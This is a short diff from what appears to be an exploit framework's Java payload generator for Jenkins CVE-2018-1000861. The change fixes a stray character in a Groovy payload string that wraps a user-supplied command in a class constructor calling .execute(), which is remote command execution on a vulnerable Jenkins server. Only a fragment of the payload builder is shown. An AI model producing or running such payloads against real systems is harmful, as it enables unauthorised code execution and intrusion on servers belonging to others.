@@ -40,7 +40,7 @@ public class JenkinsGroovyPayloadsCVE_2018_1000861 implements IPayloadGenerator 
     public void generatorPayload(Map<String, String> customArgs, IResultOutput resultOutput) {
         String command = customArgs.get("command");
         String url = customArgs.get("url");
-        final String payload = "=public class x {" +
+        final String payload = "public class x {" +
                 "public x(){" +
                 "\""+command+"\".execute()" +
                 "}" +
